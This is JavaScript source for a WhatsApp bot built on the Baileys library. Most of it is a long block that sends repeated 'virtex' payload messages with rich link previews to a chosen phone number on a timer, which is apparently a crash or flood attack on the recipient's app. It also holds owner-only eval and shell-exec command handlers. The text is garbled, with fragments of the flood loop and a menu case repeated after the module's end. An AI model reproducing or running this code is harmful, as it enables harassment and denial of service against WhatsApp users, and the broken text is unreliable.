                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
              await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
          XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
              await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
          XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
              await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
          }
          
          break




case '7404menu': {
            	anu = ` 
            
  `
  let message = await prepareWAMessageMedia({ video: fs.readFileSync('./BotMedia/menu.mp4'), gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `${global.fake}`,
           hydratedButtons: [{
                                urlButton: {
                                    displayText: 'YouTube📍',
                                    url: 'https://youtu.be/imFIX-Wrt3s'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤Owner👤',
                                    id: `${prefix}owner`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
break

case '7energycontribution': case '7tqtt': case '7tqto': case '7thanksto': case '7thankto': 
m.reply(global.tqto)
break

//GET EMAIL TEMPORARY



 default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return reply(bang)
                    }
                    try {
                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await reply(evaled)
                    } catch (err) {
                        await reply(String(err))
                      
                   }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		   if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.database
		    if (!(budy.toLowerCase() in msgs)) return
		   XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
)
obal.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
              await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
          XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
              await sleep(3000)            
               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
          }
          
          break




case '7404menu': {
            	anu = ` 
            
  `
